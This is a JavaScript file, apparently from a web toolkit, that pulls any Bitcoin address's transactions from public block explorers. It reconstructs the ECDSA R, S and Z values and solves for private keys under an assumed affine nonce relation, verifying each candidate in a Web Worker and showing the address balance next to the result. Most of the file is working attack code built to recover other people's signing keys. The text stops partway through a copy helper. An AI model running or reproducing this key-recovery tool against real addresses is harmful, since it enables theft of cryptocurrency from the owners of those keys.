/*
 * TXID / Address -> R, S, Z, Address + ECDSA AFFINE-NONCE key recovery.
 * Engine extracted from the CryptographyTube Tools collection.
 * Self-contained: depends only on CryptoJS (crypto-js) which is loaded
 * before this file. Exposes window.processTxid() and window.exportOne().
 *
 * How it works: given a Bitcoin address (or a TXID), it fetches the raw
 * transaction(s), reconstructs the ECDSA signature components (R, S, Z) for
 * every input, groups them by the signing public key, and then, for every
 * signature PAIR of a key, assumes the two nonces are related by an affine
 * equation  k2 = a*k1 + b (mod n)  and solves the two signature equations in
 * closed form for the private key:
 *
 *     d = (a*s2*z1 + b*s1*s2 - s1*z2) / (s1*r2 - a*s2*r1)   (mod n)
 *
 * This is NOT the reused-nonce (same-r) attack: here k1 != k2, so r1 != r2.
 * (a=1, b=0 is the degenerate special case that reduces to classic nonce
 * reuse.) The user supplies a and b; an optional preset sweep also tries a
 * curated list of common (a,b) relations. A result is reported ONLY when the
 * recovered key regenerates the on-chain public key — so there are no false
 * positives, no matter how many (a,b) candidates are swept. The point-mul
 * verification runs in a Web Worker so the page never freezes.
 */
(function () {
    "use strict";

    // ---- Constants -------------------------------------------------------
    const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    const N = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');

    const BLOCKCHAIN_API_KEYS = [
        "51c6e11c-1c5c-4c6e-8e8e-8e8e8e8e8e8e",
        "a1b2c3d4-e5f6-4a5b-8c7d-9e0f1a2b3c4d",
        "9e8d7c6b-5a4f-3e2d-1c0b-9a8f7e6d5c4b",
        "f1e2d3c4-b5a6-9d8c-7b6a-5f4e3d2c1b0a",
        "0a1b2c3d-4e5f-6a7b-8c9d-0e1f2a3b4c5d"
    ];

    // ---- Low-level converters -------------------------------------------
    function hexToBytes(hex) {
        if (!hex || typeof hex !== 'string') return new Uint8Array();
        if (hex.length % 2 !== 0) hex = '0' + hex;
        const matches = hex.match(/.{1,2}/g);
        if (!matches) return new Uint8Array();
        return new Uint8Array(matches.map(byte => parseInt(byte, 16)));
    }
    function bytesToHex(bytes) {
        return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
    }
    function hexToBigInt(hex) { return BigInt('0x' + hex); }

    function reverseHex(hex) {
        if (hex.length % 2 !== 0) throw new Error("Hex string length is odd.");
        return hex.match(/.{1,2}/g).reverse().join('');
    }

    function readVarInt(buf, offset) {
        let prefix = buf[offset];
        if (prefix < 0xFD) return { val: prefix, size: 1 };
        if (prefix === 0xFD) {
            let val = buf[offset + 1] | (buf[offset + 2] << 8);
            return { val: val, size: 3 };
        }
        if (prefix === 0xFE) {
            let val = buf[offset + 1] | (buf[offset + 2] << 8) | (buf[offset + 3] << 16) | (buf[offset + 4] << 24);
            return { val: val, size: 5 };
        }
        return { val: buf[offset + 1], size: 9 };
    }

    // ---- Math ------------------------------------------------------------
    function modInverse(a, m) {
        if (a === 0n) throw new Error("Division by zero (no modular inverse)");
        let m0 = m;
        let x0 = 0n;
        let x1 = 1n;
        a %= m;

        while (a > 1n) {
            if (m === 0n) throw new Error("Modular inverse does not exist");
            let q = a / m;
            let t = m;

            m = a % m;
            a = t;

            t = x0;
            x0 = x1 - q * x0;
            x1 = t;
        }

        if (a === 0n) throw new Error("Modular inverse does not exist");

        if (x1 < 0n) {
            x1 += m0;
        }
        return x1;
    }

    // ---- Hashing (CryptoJS) ---------------------------------------------
    function sha256hex(hex) { return CryptoJS.SHA256(CryptoJS.enc.Hex.parse(hex)).toString(); }
    function ripe160hex(hex) { return CryptoJS.RIPEMD160(CryptoJS.enc.Hex.parse(hex)).toString(); }
    function dblsha256(hex) { return sha256hex(sha256hex(hex)); }

    // ---- Base58 / address ------------------------------------------------
    function b58encode(hex) {
        let num = BigInt("0x" + hex);
        let str = "";
        while (num > 0) {
            str = ALPHABET[Number(num % 58n)] + str;
            num /= 58n;
        }
        for (let i = 0; i < hex.length; i += 2) {
            if (hex.substring(i, i + 2) === "00") str = "1" + str;
            else break;
        }
        return str;
    }

    function hash160ToAddress(hash160, version_byte) {
        const versioned_hash_hex = version_byte + hash160;
        const versioned_hash_bytes = CryptoJS.enc.Hex.parse(versioned_hash_hex);
        const checksum = CryptoJS.SHA256(CryptoJS.SHA256(versioned_hash_bytes)).toString().substring(0, 8);
        return b58encode(versioned_hash_hex + checksum);
    }

    function pubToAddr_P2PKH(pub_hex) {
        const pub_bin = hexToBytes(pub_hex);
        const sha256_hash = sha256hex(bytesToHex(pub_bin));
        const ripemd160_hash = ripe160hex(sha256_hash);
        return hash160ToAddress(ripemd160_hash, "00");
    }

    // ---- DER signature parsing ------------------------------------------
    function tryParseDerAt(buf, pos) {
        if (!buf || pos + 7 > buf.length) return null;
        try {
            if (buf[pos] !== 0x30) return null; // SEQUENCE (0x30)

            const total_len = buf[pos + 1];
            if (total_len < 6) return null;
            const end = pos + 2 + total_len;
            if (end > buf.length) return null;

            if (buf[pos + 2] !== 0x02) return null; // INTEGER (R-value)

            const r_len = buf[pos + 3];
            const r_start = pos + 4;
            const r_end = r_start + r_len;
            if (r_end >= buf.length || r_end >= end) return null;

            if (buf[r_end] !== 0x02) return null; // INTEGER (S-value)

            const s_len = buf[r_end + 1];
            const s_start = r_end + 2;
            const s_end = s_start + s_len;
            if (s_end > buf.length || s_end > end) return null;

            const r_bytes = buf.slice(r_start, r_end);
            const s_bytes = buf.slice(s_start, s_end);

            let r_hex = bytesToHex(r_bytes);
            let s_hex = bytesToHex(s_bytes);
            if (r_hex.startsWith('00') && r_hex.length > 2) r_hex = r_hex.substring(2);
            if (s_hex.startsWith('00') && s_hex.length > 2) s_hex = s_hex.substring(2);

            const consumed = end - pos;
            return { r: r_hex, s: s_hex, len: consumed };
        } catch (e) {
            return null;
        }
    }

    function parseDER(hex) {
        try {
            if (hex.endsWith("01") || hex.endsWith("81") || hex.endsWith("02") || hex.endsWith("82") || hex.endsWith("03") || hex.endsWith("83")) {
                hex = hex.substring(0, hex.length - 2); // Remove HashType
            }
            let cursor = 0;
            if (hex.substring(cursor, cursor + 2) !== "30") return {}; cursor += 2;
            cursor += 2; // skip total length

            if (hex.substring(cursor, cursor + 2) !== "02") return {}; cursor += 2;
            const rLen = parseInt(hex.substring(cursor, cursor + 2), 16) * 2; cursor += 2;
            let r = hex.substring(cursor, cursor + rLen); cursor += rLen;
            if (r.startsWith("00")) r = r.substring(2);

            if (hex.substring(cursor, cursor + 2) !== "02") return {}; cursor += 2;
            const sLen = parseInt(hex.substring(cursor, cursor + 2), 16) * 2; cursor += 2;
            let s = hex.substring(cursor, cursor + sLen);
            if (s.startsWith("00")) s = s.substring(2);

            return { r, s };
        } catch (e) { return {}; }
    }

    function parseScriptSig(scr) {
        const buf = hexToBytes(scr);
        let r = "", s = "", pub = "";

        // Scan for DER signature (P2PKH standard)
        for (let i = 0; i < buf.length - 10; i++) {
            const maybe = tryParseDerAt(buf, i);
            if (maybe) {
                r = maybe.r;
                s = maybe.s;
                let nextPos = i + maybe.len + 1;
                if (nextPos < buf.length) {
                    let pubPushLen = buf[nextPos];
                    if ((pubPushLen === 33 || pubPushLen === 65) && nextPos + 1 + pubPushLen <= buf.length) {
                        pub = bytesToHex(buf.slice(nextPos + 1, nextPos + 1 + pubPushLen));
                        if (!pub.startsWith("02") && !pub.startsWith("03") && !pub.startsWith("04")) pub = "";
                    }
                }
                if (r && s) break;
            }
        }

        // Fallback search for pubkey if not directly after signature
        if (!pub) {
            for (let i = 0; i < buf.length - 33; i++) {
                let len = buf[i];
                if (len === 33 || len === 65) {
                    let potential = bytesToHex(buf.slice(i + 1, i + 1 + len));
                    if (potential.startsWith("02") || potential.startsWith("03") || potential.startsWith("04")) {
                        pub = potential;
                        break;
                    }
                }
            }
        }

        return { r, s, pub };
    }

    // ---- Transaction parsing --------------------------------------------
    function parseHexTransaction(txRaw) {
        const buf = hexToBytes(txRaw);
        let cursor = 0;

        const version = bytesToHex(buf.slice(cursor, cursor + 4)); cursor += 4;

        let isSegwit = false;
        if (buf[cursor] === 0x00 && buf[cursor + 1] === 0x01) {
            isSegwit = true;
            cursor += 2;
        }

        const inCountData = readVarInt(buf, cursor); cursor += inCountData.size;
        const inputs = [];
        for (let i = 0; i < inCountData.val; i++) {
            const pre_raw = bytesToHex(buf.slice(cursor, cursor + 32));
            const vout_raw = bytesToHex(buf.slice(cursor + 32, cursor + 36));
            cursor += 36;
            const scriptLen = readVarInt(buf, cursor); cursor += scriptLen.size;
            const script_hex = bytesToHex(buf.slice(cursor, cursor + scriptLen.val)); cursor += scriptLen.val;
            const seq_raw = bytesToHex(buf.slice(cursor, cursor + 4)); cursor += 4;
            inputs.push({ pre_raw, vout_raw, script_hex, seq_raw });
        }

        const outCountData = readVarInt(buf, cursor); cursor += outCountData.size;
        const outputs = [];
        for (let i = 0; i < outCountData.val; i++) {
            const value_raw = bytesToHex(buf.slice(cursor, cursor + 8)); cursor += 8;
            const outScriptLen = readVarInt(buf, cursor); cursor += outScriptLen.size;
            const script_hex = bytesToHex(buf.slice(cursor, cursor + outScriptLen.val)); cursor += outScriptLen.val;
            outputs.push({ value_raw, script_len_raw: (outScriptLen.size === 1 ? outScriptLen.val.toString(16).padStart(2, '0') : "fd" + reverseHex(outScriptLen.val.toString(16).padStart(4, '0'))), script_hex });
        }

        if (isSegwit) {
            for (let i = 0; i < inCountData.val; i++) {
                const witnessCount = readVarInt(buf, cursor); cursor += witnessCount.size;
                const witnesses = [];
                for (let j = 0; j < witnessCount.val; j++) {
                    const itemLen = readVarInt(buf, cursor); cursor += itemLen.size;
                    witnesses.push(bytesToHex(buf.slice(cursor, cursor + itemLen.val)));
                    cursor += itemLen.val;
                }
                inputs[i].witness = witnesses;
            }
        }

        const locktime_raw = bytesToHex(buf.slice(cursor, cursor + 4));
        return { version, inputs, outputs, locktime_raw, isSegwit };
    }

    function parsingRaw(rawtx) {
        return parseHexTransaction(rawtx);
    }

    function getrsz_v2(fullTx, inputIndex, scriptPubKey) {
        // Legacy SIGHASH_ALL reconstruction
        let e = fullTx.version;
        let inCount = fullTx.inputs.length;
        let inCountHex = (inCount < 253) ? inCount.toString(16).padStart(2, '0') :
            (inCount < 65536) ? "fd" + reverseHex(inCount.toString(16).padStart(4, '0')) :
                "fe" + reverseHex(inCount.toString(16).padStart(8, '0'));

        e += inCountHex;

        for (let i = 0; i < inCount; i++) {
            const inp = fullTx.inputs[i];
            e += inp.pre_raw;
            e += inp.vout_raw;

            if (i === inputIndex) {
                const spk = scriptPubKey || "";
                const spkLen = (spk.length / 2);
                const spkLenHex = (spkLen < 253) ? spkLen.toString(16).padStart(2, '0') :
                    (spkLen < 65536) ? "fd" + reverseHex(spkLen.toString(16).padStart(4, '0')) :
                        "fe" + reverseHex(spkLen.toString(16).padStart(8, '0'));
                e += spkLenHex + spk;
            } else {
                e += "00";
            }
            e += inp.seq_raw;
        }

        // Outputs
        let outCount = fullTx.outputs.length;
        let outCountHex = (outCount < 253) ? outCount.toString(16).padStart(2, '0') : "fd" + reverseHex(outCount.toString(16).padStart(4, '0'));
        e += outCountHex;
        for (let out of fullTx.outputs) {
            e += out.value_raw + out.script_len_raw + out.script_hex;
        }

        e += fullTx.locktime_raw + "01000000"; // SIGHASH_ALL
        return dblsha256(e);
    }

    function getrsz(parsed) {
        const results = [];
        for (let i = 0; i < parsed.inputs.length; i++) {
            const inp = parsed.inputs[i];
            let r, s, pub;

            // 1. Check Legacy scriptSig
            if (inp.script_hex) {
                const sigData = parseScriptSig(inp.script_hex);
                if (sigData.r) {
                    r = sigData.r; s = sigData.s; pub = sigData.pub;
                }
            }

            // 2. Check Segwit Witness (If no legacy sig found)
            if (!r && inp.witness && inp.witness.length >= 2) {
                // In P2WPKH, Witness is [Signature, PubKey]
                const witnessSig = inp.witness[0];
                const witnessPub = inp.witness[1];
                if (witnessSig && witnessPub) {
                    const der = parseDER(witnessSig);
                    if (der.r) {
                        r = der.r; s = der.s; pub = witnessPub;
                    }
                }
            }

            if (!r || !s || !pub) continue;

            const pubHash160 = ripe160hex(sha256hex(pub));
            const scriptPubKey = "76a914" + pubHash160 + "88ac";
            const addr = pubToAddr_P2PKH(pub);

            const z = getrsz_v2(parsed, i, scriptPubKey);

            results.push({
                input_index: i,
                addr: addr,
                r: r,
                s: s,
                z: z,
                pub: pub
            });
        }
        return results;
    }

    // ---- Network ---------------------------------------------------------
    async function getRawTx(txid) {
        if (!txid || txid.length !== 64) throw new Error("Invalid TXID");

        const urls = [
            `https://blockstream.info/api/tx/${txid}/hex`,
            `https://blockchain.info/rawtx/${txid}?format=hex`
        ];

        for (let url of urls) {
            try {
                const response = await fetch(url, { signal: AbortSignal.timeout(6000) });
                if (response.ok) {
                    const rawtx = await response.text();
                    if (rawtx && rawtx.length > 50 && !rawtx.includes("not found") && !rawtx.startsWith("<!DOCTYPE")) {
                        return rawtx.trim();
                    }
                }
            } catch (e) {
                console.warn(`Fallback: Failed to fetch from ${url}. Trying next...`);
            }
            await new Promise(r => setTimeout(r, 300));
        }

        throw new Error(`API Exhaustion: Could not fetch raw TX ${txid.substring(0, 8)}. Please wait a moment and retry.`);
    }

    // List an address's transaction ids, newest first, up to `want`.
    // Primary: blockstream.info Esplora (CORS-friendly, no API key, 25/page, paged
    // by last-seen txid). Fallback: blockchain.info rawaddr (offset paging).
    // Returns an array of txids, [] if the address genuinely has none, or null if
    // every explorer failed (network / CORS / rate-limit) so the caller can warn.
    async function fetchAddressTxids(addr, want, onProgress) {
        let anyOk = false;

        // --- blockstream.info Esplora (primary) ---
        try {
            let txids = [];
            let lastSeen = '';
            let guard = 0;
            while (txids.length < want && guard < 5000) {
                guard++;
                const url = lastSeen
                    ? `https://blockstream.info/api/address/${addr}/txs/chain/${lastSeen}`
                    : `https://blockstream.info/api/address/${addr}/txs/chain`;
                const resp = await fetch(url, { signal: AbortSignal.timeout(15000) });
                if (!resp.ok) break;
                anyOk = true;
                const arr = await resp.json();
                if (!Array.isArray(arr) || arr.length === 0) break;
                for (const t of arr) txids.push(t.txid);
                lastSeen = arr[arr.length - 1].txid;
                if (onProgress) onProgress({ phase: 'list', listed: txids.length, target: want });
                if (arr.length < 25) break;               // final (short) page
                await new Promise(r => setTimeout(r, 120));
            }
            if (txids.length > 0) return txids.slice(0, want);
            if (anyOk) return [];                          // responded OK but no txs
        } catch (e) { /* fall through to blockchain.info */ }

        // --- blockchain.info rawaddr (fallback) ---
        try {
            let txids = [];
            let total = null;
            let offset = 0;
            const PAGE = 50;                               // rawaddr max per request
            while (txids.length < want) {
                const pageLimit = Math.min(PAGE, want - txids.length);
                const url = `https://blockchain.info/rawaddr/${addr}?limit=${pageLimit}&offset=${offset}&cors=true`;
                const resp = await fetch(url, { signal: AbortSignal.timeout(15000) });
                if (!resp.ok) break;
                anyOk = true;
                const data = await resp.json();
                if (!data || !Array.isArray(data.txs)) break;
                if (total === null) total = data.n_tx || 0;
                if (data.txs.length === 0) break;
                for (const tx of data.txs) txids.push(tx.hash);
                offset += data.txs.length;
                if (onProgress) onProgress({ phase: 'list', listed: txids.length, target: Math.min(want, total || want) });
                if (total && offset >= total) break;
                if (data.txs.length < pageLimit) break;
                await new Promise(r => setTimeout(r, 150));
            }
            if (txids.length > 0) return txids.slice(0, want);
            if (anyOk) return [];
        } catch (e) { /* both sources failed */ }

        return anyOk ? [] : null;
    }

    async function fetchBlockchainData(addr, want, onProgress) {
        want = Math.max(1, parseInt(want, 10) || 100);
        const results = [];

        // 1) Collect exactly `want` tx ids for the address (capped at what exists).
        const txHashes = await fetchAddressTxids(addr, want, onProgress);
        if (txHashes === null) {
            throw new Error("Couldn't reach a block explorer for this address (it may be rate-limiting). Please wait a few seconds and try again, or lower the count.");
        }
        if (txHashes.length === 0) return results;         // address has no transactions

        // 2) For each tx: fetch raw hex, reconstruct R,S,Z, keep the inputs this
        //    address signed. Small concurrent batches + throttle to dodge rate limits.
        const target = txHashes.length;
        let scanned = 0;
        const BATCH = 4;
        for (let b = 0; b < txHashes.length; b += BATCH) {
            const slice = txHashes.slice(b, b + BATCH);
            const settled = await Promise.all(slice.map(async (h) => {
                try {
                    const raw = await getRawTx(h);
                    const parsed = parsingRaw(raw);
                    const matched = getrsz(parsed).filter(it => it.addr === addr);
                    matched.forEach(it => { it.txid = h; });
                    return matched;
                } catch (e) { return []; }
            }));
            settled.forEach(arr => { for (const it of arr) results.push(it); });
            scanned += slice.length;
            if (onProgress) onProgress({ phase: 'scan', scanned: scanned, target: target, found: results.length });
            await new Promise(r => setTimeout(r, 120));
        }
        return results;
    }

    // ---- Address balance / activity stats (same box as Address Analysis) --
    function formatBtc(sats) {
        const n = Number(sats || 0) / 1e8;                 // < 2^53, safe for BTC supply
        const s = n.toFixed(8).replace(/\.?0+$/, '');
        return (s || '0') + ' BTC';
    }

    // Balance / Received / TX for an address. blockstream primary, blockchain.info
    // fallback. Returns {balance, received, tx} (satoshis) or null on total failure.
    async function fetchAddressStats(addr) {
        try {
            const resp = await fetch(`https://blockstream.info/api/address/${addr}`, { signal: AbortSignal.timeout(15000) });
            if (resp.ok) {
                const d = await resp.json();
                const c = d.chain_stats || {};
                const m = d.mempool_stats || {};
                const funded = (c.funded_txo_sum || 0) + (m.funded_txo_sum || 0);
                const spent = (c.spent_txo_sum || 0) + (m.spent_txo_sum || 0);
                const txc = (c.tx_count || 0) + (m.tx_count || 0);
                return { balance: funded - spent, received: funded, tx: txc };
            }
        } catch (e) { /* fall through */ }
        try {
            const resp = await fetch(`https://blockchain.info/rawaddr/${addr}?limit=0&cors=true`, { signal: AbortSignal.timeout(15000) });
            if (resp.ok) {
                const d = await resp.json();
                return { balance: d.final_balance || 0, received: d.total_received || 0, tx: d.n_tx || 0 };
            }
        } catch (e) { /* give up */ }
        return null;
    }

    // Rotating balance-check spinner — the same wheel the Public Key Toolkit /
    // private-keys pages show while an explorer request is in flight. Own class
    // (.txr-spin, not .fa-icon) so the global icon-tint filters never recolour it;
    // it is tinted + spun by tool.css.
    function spinner(size) {
        const n = size || 13;
        return '<img src="../assets/svgs/solid/spinner.svg" class="txr-spin" width="' + n +
            '" height="' + n + '" alt="loading">';
    }
    function setStats(stats) {
        const b = document.getElementById('txr-stat-balance');
        const r = document.getElementById('txr-stat-received');
        const t = document.getElementById('txr-stat-tx');
        // Turn the amount green when the address holds (Balance) or has ever held
        // (Received) coins — matching the private-keys balance colour (#22c55e).
        if (b) { b.textContent = stats ? formatBtc(stats.balance) : '0 BTC'; b.classList.toggle('has-balance', !!(stats && stats.balance > 0)); }
        if (r) { r.textContent = stats ? formatBtc(stats.received) : '0 BTC'; r.classList.toggle('has-balance', !!(stats && stats.received > 0)); }
        if (t) t.textContent = stats ? String(stats.tx) : '0';
    }
    // Show the spinner in the Balance / Received / TX boxes while their lookup runs.
    function statLoading() {
        ['txr-stat-balance', 'txr-stat-received', 'txr-stat-tx'].forEach(function (id) {
            const el = document.getElementById(id);
            if (el) { el.innerHTML = spinner(16); el.classList.remove('has-balance'); }
        });
    }

    async function resolveInputToRSZ(input, want, onProgress) {
        if (!input) return [];
        let inText = input.trim();
        // Detect if Address (roughly 26-62 chars, no colons)
        if (inText.length >= 26 && inText.length <= 62 && !inText.includes(':')) {
            return await fetchBlockchainData(inText, want, onProgress);
        }
        // Assume RSZ Bulk format
        return inText.split('\n').map(l => {
            let p = l.split(':');
            if (p.length >= 3) return { r: p[0].trim(), s: p[1].trim(), z: p[2].trim() };
            return null;
        }).filter(it => it && it.r.length > 50);
    }

    // ---- Affine-nonce recovery (closed form, verified in a Web Worker) ---
    // The crypto core lives inside this function; it is never called on the
    // main thread — we stringify it and spin it up as a Worker so the point-mul
    // verification (one scalar-mul per distinct candidate key) never blocks the
    // page. Pure BigInt, no DOM / CryptoJS / fetch.
    // Message in : {groups:[{addr,pub,sigs:[{r,s,z}]}], ab:[[aStr,bStr],…]}
    //   (r,s,z are hex; a,b are decimal strings already reduced into [0,n)).
    // Messages out: {type:'progress',…} then {type:'done',results}.
    function leakWorkerBody() {
        "use strict";
        var P = (2n ** 256n) - (2n ** 32n) - 977n;
        var N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141n;
        var Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798n;
        var Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8n;

        function mod(a, m) { var r = a % m; return r < 0n ? r + m : r; }
        function egcd(a, b) { if (b === 0n) return [a, 1n, 0n]; var r = egcd(b, a % b); return [r[0], r[2], r[1] - (a / b) * r[2]]; }
        function modInv(a, m) { a = mod(a, m); var r = egcd(a, m); if (r[0] !== 1n) throw new Error("no inverse"); return mod(r[1], m); }
        function ptAdd(Pp, Qp) {
            if (!Pp) return Qp; if (!Qp) return Pp;
            if (Pp.x === Qp.x && mod(Pp.y + Qp.y, P) === 0n) return null;
            var l;
            if (Pp.x === Qp.x && Pp.y === Qp.y) { l = mod((3n * Pp.x * Pp.x) * modInv(2n * Pp.y, P), P); }
            else { l = mod((Qp.y - Pp.y) * modInv(mod(Qp.x - Pp.x, P), P), P); }
            var x = mod(l * l - Pp.x - Qp.x, P);
            var y = mod(l * (Pp.x - x) - Pp.y, P);
            return { x: x, y: y };
        }
        function sMul(k) {
            k = mod(k, N); var R = null; var A = { x: Gx, y: Gy };
            while (k > 0n) { if (k & 1n) R = ptAdd(R, A); A = ptAdd(A, A); k >>= 1n; }
            return R;
        }
        function hx(b) { var s = b.toString(16); while (s.length < 64) s = "0" + s; return s; }
        function compressPoint(Q) { return (Q.y & 1n ? "03" : "02") + hx(Q.x); }
        function compressPub(pub) {
            pub = pub.toLowerCase();
            if (pub.length === 66 && (pub.slice(0, 2) === "02" || pub.slice(0, 2) === "03")) return pub;
            if (pub.length === 130 && pub.slice(0, 2) === "04") {
                var x = pub.slice(2, 66); var y = BigInt("0x" + pub.slice(66));
                return (y & 1n ? "03" : "02") + x;
            }
            return null;
        }

        // Closed-form affine-nonce recovery. For sig1=(r1,s1,z1), sig2=(r2,s2,z2)
        // with nonces related by k2 = a*k1 + b (mod n), the two signing
        // equations s*k = z + r*d give, after eliminating k1 and k2:
        //   d = (a*s2*z1 + b*s1*s2 - s1*z2) / (s1*r2 - a*s2*r1)   (mod n)
        // Returns the candidate d, or null if the denominator vanishes
        // (degenerate pair — e.g. a=1,b=0 with r1==r2, or a linearly dependent
        // pair). BigInt is exact, so the products never overflow.
        function solveAffine(s1, s2, a, b) {
            var num = mod(a * s2.s * s1.z + b * s1.s * s2.s - s1.s * s2.z, N);
            var den = mod(s1.s * s2.r - a * s2.s * s1.r, N);
            if (den === 0n) return null;
            return mod(num * modInv(den, N), N);
        }

        // Cap the signatures fed to the O(m^2) pair sweep so one huge signer
        // can't stall the worker. Every candidate is still verified d*G == pub,
        // so the cap only bounds effort, never correctness; a capped signer is
        // reported (out.capped) so the truncation is never silent.
        var MAXSIGS = 16;
        function analyzeGroup(g, abList, report) {
            var raw = g.sigs.map(function (s) { return { r: BigInt("0x" + s.r), s: BigInt("0x" + s.s), z: BigInt("0x" + s.z) }; });
            var seenSig = {}, sigs = [];
            for (var i = 0; i < raw.length; i++) {
                var kk = raw[i].r.toString() + "_" + raw[i].s.toString() + "_" + raw[i].z.toString();
                if (!seenSig[kk]) { seenSig[kk] = 1; sigs.push(raw[i]); }
            }
            var cpub = compressPub(g.pub);
            var avail = sigs.length;
            var out = { addr: g.addr, pub: g.pub, count: avail, found: false };
            // Affine recovery needs exactly two signatures from one key.
            if (!cpub || avail < 2) return out;

            var used = sigs.slice(0, MAXSIGS);
            var m = used.length;
            if (avail > MAXSIGS) out.capped = avail;

            // A candidate d is the key or it is not — independent of which
            // (a,b)/pair produced it. Cache rejected d's so we never repeat the
            // (expensive) scalar-mul for the same value.
            var tried = {};
            function verify(d, a, b, i, j) {
                if (d === null || d <= 0n || d >= N) return false;
                var key = d.toString();
                if (tried[key]) return false;
                tried[key] = 1;
                var Q = sMul(d);
                if (!Q || compressPoint(Q) !== cpub) return false;
                var pk = d.toString(16); while (pk.length < 64) pk = "0" + pk;
                out.found = true; out.priv = pk;
                out.a = a.toString(); out.b = b.toString();
                out.usedSigs = m; out.pairI = i; out.pairJ = j;
                return true;
            }

            for (var ai = 0; ai < abList.length; ai++) {
                var a = abList[ai][0], b = abList[ai][1];
                report({ type: "progress", phase: "attempt", a: a.toString(), b: b.toString() });
                for (var p = 0; p < m; p++) {
                    for (var q = 0; q < m; q++) {
                        if (p === q) continue;              // both directions of every pair
                        if (verify(solveAffine(used[p], used[q], a, b), a, b, p, q)) return out;
                    }
                }
            }
            return out;
        }
        onmessage = function (e) {
            var groups = e.data.groups;
            var abList = (e.data.ab || [["1", "1"]]).map(function (p) { return [BigInt(p[0]), BigInt(p[1])]; });
            var results = [];
            for (var gi = 0; gi < groups.length; gi++) {
                (function (gi) {
                    var g = groups[gi];
                    postMessage({ type: "progress", phase: "signer", gi: gi, total: groups.length, addr: g.addr, count: g.sigs.length });
                    results.push(analyzeGroup(g, abList, function (pr) { pr.gi = gi; pr.total = groups.length; pr.addr = g.addr; postMessage(pr); }));
                })(gi);
            }
            postMessage({ type: "done", results: results });
        };
    }

    var WORKER_SRC = '(' + leakWorkerBody.toString() + ')()';
    var _leakWorkerURL = null;
    function buildWorker() {
        try {
            if (typeof Worker === 'undefined' || typeof URL === 'undefined' || !URL.createObjectURL) return null;
            if (!_leakWorkerURL) _leakWorkerURL = URL.createObjectURL(new Blob([WORKER_SRC], { type: 'application/javascript' }));
            return new Worker(_leakWorkerURL);
        } catch (e) { return null; }
    }

    // Group extracted signatures by signing public key (one signer each).
    function groupByPub(rsz) {
        var map = {};
        for (var i = 0; i < rsz.length; i++) {
            var e = rsz[i];
            if (!e.pub || !e.r || !e.s || !e.z) continue;
            if (!map[e.pub]) map[e.pub] = { pub: e.pub, addr: e.addr, sigs: [] };
            map[e.pub].sigs.push({ r: e.r, s: e.s, z: e.z });
        }
        return Object.keys(map).map(function (k) { return map[k]; });
    }

    // Run the affine-nonce analysis in the worker. `ab` is the list of
    // [aStr,bStr] relations to sweep. Resolves {groups, results}:
    //   results = array of per-signer verdicts (only signers with >=2 sigs),
    //   results = []   -> nobody had two signatures from one key,
    //   results = null -> Web Worker unavailable / errored.
    function runLeakAnalysis(rsz, ab, onProgress) {
        return new Promise(function (resolve) {
            var groups = groupByPub(rsz);
            var candidates = groups.filter(function (g) { return g.sigs.length >= 2; });
            if (!candidates.length) { resolve({ groups: groups, results: [] }); return; }
            var w = buildWorker();
            if (!w) { resolve({ groups: groups, results: null }); return; }
            w.onmessage = function (ev) {
                var d = ev.data;
                if (d.type === 'progress') { if (onProgress) onProgress(d); }
                else if (d.type === 'done') { try { w.terminate(); } catch (e) { } resolve({ groups: groups, results: d.results }); }
            };
            w.onerror = function () { try { w.terminate(); } catch (e) { } resolve({ groups: groups, results: null }); };
            w.postMessage({ groups: candidates.map(function (g) { return { addr: g.addr, pub: g.pub, sigs: g.sigs }; }), ab: ab });
        });
    }

    // ---- Output header + export (de-branded) -----------------------------
    function getOutputHeader(elementId) {
        let header = `<div class="result-header">CRYPTOGRAPHYTUBE<span class="tool-tag">Affine-Nonce Analysis</span></div>`;
        if (elementId) {
            header += `
            <div class="download-tools">
                <button class="btn-small btn-txt" title="Export as TXT" onclick="exportOne('${elementId}', 'txt')">
                    <img src="../assets/svgs/solid/download.svg" width="12" height="12" alt=""> SAVE TXT
                </button>
            </div>`;
        }
        return header;
    }

    function exportOne(id, type) {
        const el = document.getElementById(id);
        if (!el || el.innerText.trim() === "" || el.innerText.includes("Waiting for input...") || el.innerText.length < 5) {
            alert("No results to export for this section yet.");
            return;
        }

        const section = el.closest('.tool-section');
        const title = section ? (section.querySelector('h3') ? section.querySelector('h3').innerText : "CryptographyTube Result") : "CryptographyTube Result";
        let rawText = el.innerText || el.textContent;

        let headerText = `CRYPTOGRAPHYTUBE REPORT\n`;
        headerText += `TOOL: ${title.toUpperCase()}\n`;
        headerText += `GENERATED: ${new Date().toLocaleString()}\n`;
        headerText += `--------------------------------------------------\n\n`;

        const fullContent = headerText + rawText;

        if (type === 'txt') {
            const blob = new Blob([fullContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `CryptographyTube_Report_${id}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    }

    // ---- HTML helpers ----------------------------------------------------
    function escapeHtml(s) {
        return String(s == null ? '' : s)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    }

    function copyBtn(text) {
        if (text == null || text === '') return '';
        return '<button type="button" class="rsz-copy" title="Copy" data-copy="' +
            escapeHtml(text) + '"><img src="../assets/svgs/regular/copy.svg" width="12" height="12" alt="copy"></button>';
    }

    // one mono value + copy button (TXID, recovered key, R/S/Z, pubkey…)
    function monoCell(val, extraCls) {
        return '<code class="rsz-val ' + (extraCls || '') + '">' + escapeHtml(val || '—') + '</code>' + copyBtn(val);
    }
    function rszLine(label, val) {
        return '<div class="rsz-line"><span class="rsz-tag">' + label + '</span>' + monoCell(val) + '</div>';
    }
    function addrLine(label, val) {
        return '<div class="rsz-line"><span class="rsz-tag">' + label + '</span>' +
            '<code class="rsz-val rsz-addr-val">' + escapeHtml(val || '—') + '</code>' + copyBtn(val) + '</div>';
    }

    // Delegated copy handler (attached once for the whole page)
    function fallbackCopy(text, done) {
        try {
